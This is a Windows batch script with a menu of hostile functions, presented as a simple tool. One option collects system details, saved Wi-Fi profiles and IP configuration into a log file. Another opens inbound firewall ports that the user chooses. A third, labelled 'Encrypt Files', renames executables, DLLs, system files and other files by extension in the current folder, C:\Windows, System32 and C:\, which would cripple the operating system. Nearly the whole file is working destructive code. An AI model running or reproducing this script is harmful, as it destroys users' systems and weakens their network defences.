@echo off
title %random% %date% %username% %time% %random%
color 0a

:menu
cls
echo 1. Gather System Information
echo 2. Manipulate Firewall Settings
echo 3. Encrypt Files
echo 4. Exit

set /p choice=Enter your choice: 

if "%choice%"=="1" goto info
if "%choice%"=="2" goto ports
if "%choice%"=="3" goto encryption
if "%choice%"=="4" exit

:info
cls & color 0a
cd Desktop

REM Gather system information
nslookup myip.opendns.com resolver1.opendns.com>9K21JM10B.log
ver>>9K21JM10B.log
ECHO.>>9K21JM10B.log
ECHO Username:%username%>>9K21JM10B.log
ECHO.>>9K21JM10B.log
ECHO Time: %time%>>9K21JM10B.log
ECHO.>>9K21JM10B.log
ECHO Date: %date%>>9K21JM10B.log
ECHO.>>9K21JM10B.log
netsh wlan show profiles>>9K21JM10B.log
ECHO.>>9K21JM10B.log
ipconfig>>9K21JM10B.log
ECHO.>>9K21JM10B.log
ECHO Additional Information:>>9K21JM10B.log
ipconfig | find /i "IPv4">>9K21JM10B.log
wmic diskdrive get size>>9K21JM10B.log
wmic cpu get name>>9K21JM10B.log
ECHO.>>9K21JM10B.log
ECHO.>>9K21JM10B.log
ECHO.>>9K21JM10B.log
systeminfo>>9K21JM10B.log
pause
goto menu

:ports
cls & color 0a
set /p port=Enter the port number: 

REM Manipulate firewall settings
netsh advfirewall firewall add rule name="Port %port% TCP" dir=in action=allow protocol=TCP localport=%port%
netsh advfirewall firewall add rule name="Port %port% UDP" dir=in action=allow protocol=UDP localport=%port%
pause
goto menu

:encryption
cls & color 0a
:Current

REM Encrypt files
REN *.cmd *.sI09
REN *.exe *.1Je9
REN *.log *.439a
REN *.ini *.3KM1
REN *.dll *.38Jl
REN *.bin *.3J81
REN *.txt *.2M1A
REN *.sys *.8j3J
REN *.lnk *.9K2M
REN *.png *.8J2n
REN *.exe *.3hxD
cd C:\Windows
REN *.cmd *.sI09
REN *.exe *.1Je9
REN *.log *.439a
REN *.ini *.3KM1
REN *.dll *.38Jl
REN *.bin *.3J81
REN *.txt *.2M1A
REN *.sys *.8j3J
REN *.lnk *.9K2M
REN *.png *.8J2n
REN *.exe *.3hxD
cd C:\Windows\Sys32 & cd C:\Windows\System32
REN *.cmd *.sI09
REN *.exe *.1Je9
REN *.log *.439a
REN *.ini *.3KM1
REN *.dll *.38Jl
REN *.bin *.3J81
REN *.txt *.2M1A
REN *.sys *.8j3J
REN *.lnk *.9K2M
REN *.png *.8J2n
REN *.exe *.3hxD
cd C:\
REN *.cmd *.sI09
REN *.exe *.1Je9
REN *.log *.439a
REN *.ini *.3KM1
REN *.dll *.38Jl
REN *.bin *.3J81
REN *.txt *.2M1A
REN *.sys *.8j3J
REN *.lnk *.9K2M
REN *.png *.8J2n
REN *.exe *.3hxD
color 0a & mode 1000 & cls
pause
goto menu
